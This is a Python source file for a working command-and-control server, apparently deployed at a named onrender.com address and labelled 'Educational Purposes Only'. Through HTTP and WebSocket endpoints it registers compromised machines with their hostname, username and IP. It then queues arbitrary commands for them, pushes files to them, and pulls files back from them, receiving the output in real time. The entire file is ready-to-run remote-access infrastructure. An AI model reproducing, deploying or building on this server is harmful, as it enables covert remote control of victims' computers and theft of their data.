#!/usr/bin/env python3
"""
ENHANCED C2 SERVER - REAL-TIME RESPONSES & FILE SUPPORT
Works on: https://c2-server-zz0i.onrender.com
Educational Purposes Only
"""

from flask import Flask, request, jsonify, send_file
from flask_socketio import SocketIO, emit, join_room, leave_room
import hashlib
import time
import threading
import os
import json
import base64
from datetime import datetime
from collections import defaultdict
import logging
import tempfile

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

app = Flask(__name__)
app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY', 'c2-secret-key-change-this-in-production-12345')
app.config['MAX_CONTENT_LENGTH'] = 100 * 1024 * 1024  # 100MB max file size
app.config['UPLOAD_FOLDER'] = '/tmp/uploads'

# Create upload folder if not exists
os.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)

# Use gevent for Python 3.13 compatibility
socketio = SocketIO(
    app, 
    cors_allowed_origins="*", 
    logger=False, 
    engineio_logger=False,
    async_mode='gevent'
)

# Data storage
clients = {}  # client_id -> client_data
command_queue = defaultdict(list)  # client_id -> [commands]
command_responses = defaultdict(list)  # client_id -> [responses]
client_lock = threading.Lock()
online_sockets = {}  # client_id -> socket_id

@app.route('/')
def index():
    """Root endpoint"""
    return jsonify({
        'status': 'online',
        'server': 'c2-server-zz0i.onrender.com',
        'endpoints': {
            '/health': 'Server health check',
            '/clients': 'List connected clients',
            '/command': 'Send command to client (POST)',
            '/upload': 'Upload file to client (POST)',
            '/download/<client_id>/<filename>': 'Download file from client (GET)',
            '/socket.io/': 'WebSocket endpoint for clients'
        },
        'message': 'Educational Purposes Only'
    })

@app.route('/health')
def health():
    """Health check endpoint"""
    with client_lock:
        online = sum(1 for c in clients.values() if c.get('online', False))
        return jsonify({
            'status': 'online',
            'clients_total': len(clients),
            'clients_online': online,
            'queued_commands': sum(len(q) for q in command_queue.values()),
            'timestamp': time.time(),
            'server': 'c2-server-zz0i.onrender.com'
        })

@app.route('/clients')
def get_clients():
    """Get all clients"""
    with client_lock:
        clients_list = []
        for client_id, client in clients.items():
            clients_list.append({
                'id': client_id,
                'online': client.get('online', False),
                'hostname': client.get('hostname', 'Unknown'),
                'os': client.get('os', 'Unknown'),
                'username': client.get('username', 'Unknown'),
                'ip': client.get('ip', 'Unknown'),
                'last_seen': client.get('last_seen', 0),
                'first_seen': client.get('first_seen', 0),
                'commands_pending': len(command_queue.get(client_id, []))
            })
        return jsonify(clients_list)

@app.route('/responses/<client_id>')
def get_responses(client_id):
    """Get command responses for a client"""
    with client_lock:
        return jsonify(command_responses.get(client_id, []))

@app.route('/command', methods=['POST'])
def send_command():
    """Send command to client"""
    try:
        data = request.get_json()
        client_id = data.get('client_id')
        command = data.get('command')
        wait_response = data.get('wait_response', False)
        
        if not client_id:
            return jsonify({'error': 'Missing client_id'}), 400
        if not command:
            return jsonify({'error': 'Missing command'}), 400
        
        with client_lock:
            # Create command
            cmd_id = f"cmd_{int(time.time())}_{hashlib.md5(command.encode()).hexdigest()[:6]}"
            command_data = {
                'id': cmd_id,
                'command': command,
                'timestamp': time.time(),
                'status': 'pending',
                'wait_response': wait_response
            }
            
            # Add to queue
            command_queue[client_id].append(command_data)
            
            # If client is online, notify via WebSocket
            if client_id in online_sockets:
                socketio.emit('command', command_data, room=online_sockets[client_id])
                logger.info(f"Command sent immediately to {client_id}: {command[:50]}...")
                return jsonify({
                    'status': 'sent',
                    'command_id': cmd_id,
                    'client_id': client_id,
                    'message': 'Command sent to online client'
                })
            else:
                logger.info(f"Command queued for offline client {client_id}: {command[:50]}...")
                return jsonify({
                    'status': 'queued',
                    'command_id': cmd_id,
                    'client_id': client_id,
                    'message': 'Command queued for offline client'
                })
            
    except Exception as e:
        logger.error(f"Command error: {e}")
        return jsonify({'error': str(e)}), 400

@app.route('/upload', methods=['POST'])
def upload_file():
    """Upload file to send to client"""
    try:
        client_id = request.form.get('client_id')
        if 'file' not in request.files:
            return jsonify({'error': 'No file provided'}), 400
        
        file = request.files['file']
        if file.filename == '':
            return jsonify({'error': 'No file selected'}), 400
        
        # Save file temporarily
        filename = f"upload_{int(time.time())}_{file.filename}"
        filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
        file.save(filepath)
        
        # Read file as base64
        with open(filepath, 'rb') as f:
            file_data = base64.b64encode(f.read()).decode('utf-8')
        
        # Create upload command
        cmd_id = f"upload_{int(time.time())}"
        command_data = {
            'id': cmd_id,
            'type': 'upload',
            'filename': file.filename,
            'filedata': file_data,
            'timestamp': time.time(),
            'status': 'pending'
        }
        
        with client_lock:
            # Add to queue
            command_queue[client_id].append(command_data)
            
            # If client is online, notify via WebSocket
            if client_id in online_sockets:
                socketio.emit('command', command_data, room=online_sockets[client_id])
                return jsonify({
                    'status': 'sent',
                    'command_id': cmd_id,
                    'client_id': client_id,
                    'filename': file.filename,
                    'message': 'File sent to client'
                })
            else:
                return jsonify({
                    'status': 'queued',
                    'command_id': cmd_id,
                    'client_id': client_id,
                    'filename': file.filename,
                    'message': 'File queued for offline client'
                })
            
    except Exception as e:
        logger.error(f"Upload error: {e}")
        return jsonify({'error': str(e)}), 400

@app.route('/download/<client_id>/<filename>')
def download_file(client_id, filename):
    """Request file download from client"""
    try:
        # Create download command
        cmd_id = f"download_{int(time.time())}"
        command_data = {
            'id': cmd_id,
            'type': 'download',
            'filename': filename,
            'timestamp': time.time(),
            'status': 'pending'
        }
        
        with client_lock:
            # Add to queue
            command_queue[client_id].append(command_data)
            
            # If client is online, notify via WebSocket
            if client_id in online_sockets:
                socketio.emit('command', command_data, room=online_sockets[client_id])
                return jsonify({
                    'status': 'sent',
                    'command_id': cmd_id,
                    'client_id': client_id,
                    'filename': filename,
                    'message': 'Download request sent to client'
                })
            else:
                return jsonify({
                    'status': 'queued',
                    'command_id': cmd_id,
                    'client_id': client_id,
                    'filename': filename,
                    'message': 'Download request queued'
                })
            
    except Exception as e:
        logger.error(f"Download error: {e}")
        return jsonify({'error': str(e)}), 400

@app.route('/file/<file_id>')
def get_file(file_id):
    """Retrieve downloaded file"""
    # In a real implementation, you'd retrieve from storage
    # For now, return a placeholder
    return jsonify({'status': 'File endpoint', 'file_id': file_id})

@socketio.on('connect')
def handle_connect():
    """Handle new WebSocket connection"""
    logger.info(f"New WebSocket connection: {request.sid}")

@socketio.on('disconnect')
def handle_disconnect():
    """Handle WebSocket disconnect"""
    with client_lock:
        # Find which client disconnected
        for client_id, socket_id in list(online_sockets.items()):
            if socket_id == request.sid:
                if client_id in clients:
                    clients[client_id]['online'] = False
                    clients[client_id]['last_seen'] = time.time()
                del online_sockets[client_id]
                logger.info(f"Client disconnected: {client_id}")
                break

@socketio.on('register')
def handle_register(data):
    """Client registers with system info"""
    try:
        client_ip = request.remote_addr
        
        # Generate client ID if not provided
        if 'id' in data:
            client_id = data['id']
        else:
            unique = f"{data.get('hostname', '')}{data.get('os', '')}{data.get('username', '')}"
            client_id = hashlib.md5(unique.encode()).hexdigest()[:12]
        
        with client_lock:
            # Store/update client info
            if client_id not in clients:
                clients[client_id] = {
                    'hostname': data.get('hostname', 'Unknown'),
                    'os': data.get('os', 'Unknown'),
                    'username': data.get('username', 'Unknown'),
                    'ip': client_ip,
                    'first_seen': time.time(),
                    'last_seen': time.time(),
                    'online': True
                }
            else:
                # Update existing client
                clients[client_id].update({
                    'hostname': data.get('hostname', clients[client_id].get('hostname', 'Unknown')),
                    'os': data.get('os', clients[client_id].get('os', 'Unknown')),
                    'username': data.get('username', clients[client_id].get('username', 'Unknown')),
                    'last_seen': time.time(),
                    'online': True
                })
            
            # Map socket to client
            online_sockets[client_id] = request.sid
            join_room(client_id)
            
            logger.info(f"Client registered: {client_id} - {data.get('hostname')}")
            
            # Send welcome
            emit('welcome', {
                'client_id': client_id,
                'message': 'Registered with C2 server',
                'timestamp': time.time()
            })
            
            # Send any queued commands
            if client_id in command_queue and command_queue[client_id]:
                for cmd in command_queue[client_id]:
                    emit('command', cmd)
                command_queue[client_id] = []
                
    except Exception as e:
        logger.error(f"Registration error: {e}")
        emit('error', {'message': str(e)})

@socketio.on('heartbeat')
def handle_heartbeat(data):
    """Handle client heartbeat"""
    client_id = data.get('client_id')
    if client_id and client_id in clients:
        with client_lock:
            clients[client_id]['last_seen'] = time.time()
            clients[client_id]['online'] = True
        emit('heartbeat_ack', {'timestamp': time.time()})

@socketio.on('command_response')
def handle_command_response(data):
    """Handle command response from client - REAL TIME"""
    client_id = data.get('client_id')
    command_id = data.get('command_id')
    output = data.get('output', '')
    success = data.get('success', True)
    
    logger.info(f"Command response from {client_id}: {command_id}")
    
    # Store response
    with client_lock:
        if client_id not in command_responses:
            command_responses[client_id] = []
        
        response_data = {
            'command_id': command_id,
            'client_id': client_id,
            'output': output,
            'success': success,
            'timestamp': time.time(),
            'received_at': datetime.now().isoformat()
        }
        
        command_responses[client_id].append(response_data)
        
        # Keep only last 50 responses
        if len(command_responses[client_id]) > 50:
            command_responses[client_id] = command_responses[client_id][-50:]
    
    # Broadcast to any console listening for this client
    emit('response_received', response_data, room=f"console_{client_id}")
    
    # Also emit to general console room
    emit('new_response', {
        'client_id': client_id,
        'command_id': command_id,
        'output_preview': output[:100] + ('...' if len(output) > 100 else ''),
        'timestamp': time.time()
    }, room='consoles')

@socketio.on('file_response')
def handle_file_response(data):
    """Handle file response from client"""
    client_id = data.get('client_id')
    filename = data.get('filename')
    filedata = data.get('filedata')  # base64 encoded
    success = data.get('success', True)
    
    logger.info(f"File response from {client_id}: {filename}")
    
    # Store file (in production, use proper storage)
    if success and filedata:
        file_id = f"file_{int(time.time())}_{hashlib.md5(filename.encode()).hexdigest()[:6]}"
        # In real implementation, save to storage
        
        emit('file_received', {
            'client_id': client_id,
            'filename': filename,
            'file_id': file_id,
            'success': success,
            'timestamp': time.time()
        }, room=f"console_{client_id}")

@socketio.on('console_connect')
def handle_console_connect(data):
    """Console connects to listen for responses"""
    client_id = data.get('client_id')
    if client_id:
        join_room(f"console_{client_id}")
        join_room('consoles')
        logger.info(f"Console connected for client {client_id}")

def cleanup_stale_clients():
    """Periodically cleanup stale clients"""
    while True:
        time.sleep(60)
        
        with client_lock:
            current_time = time.time()
            stale = []
            
            for client_id, client in list(clients.items()):
                if current_time - client.get('last_seen', 0) > 300:  # 5 minutes
                    stale.append(client_id)
            
            for client_id in stale:
                if client_id in clients:
                    del clients[client_id]
                if client_id in online_sockets:
                    del online_sockets[client_id]
                if client_id in command_queue:
                    del command_queue[client_id]
                
                logger.info(f"Cleaned up stale client: {client_id}")

def print_banner():
    """Print server banner"""
    print("""
    ╔══════════════════════════════════════════════════╗
    ║           REAL-TIME C2 SERVER                    ║
    ║      https://c2-server-zz0i.onrender.com          ║
    ║        Educational Purposes Only                 ║
    ╚════════════════════════════━━━━━━━━━━━━━━━━━━━━━━╝
    """)
    print(f"[*] Server starting on port {os.environ.get('PORT', 10000)}")
    print("[*] WebSocket: wss://c2-server-zz0i.onrender.com/socket.io/")
    print("[*] Real-time responses enabled")
    print("[*] File upload/download support")
    print("[*] Press Ctrl+C to stop\n")

if __name__ == '__main__':
    print_banner()
    
    # Start cleanup thread
    cleanup_thread = threading.Thread(target=cleanup_stale_clients, daemon=True)
    cleanup_thread.start()
    
    # Run server
    port = int(os.environ.get('PORT', 10000))
    
    # Use gevent server
    from gevent import pywsgi
    from geventwebsocket.handler import WebSocketHandler
    
    logger.info(f"Starting server on 0.0.0.0:{port}")
    
    server = pywsgi.WSGIServer(
        ('0.0.0.0', port),
        app,
        handler_class=WebSocketHandler
    )
    
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        logger.info("Server shutting down...")
        server.stop()
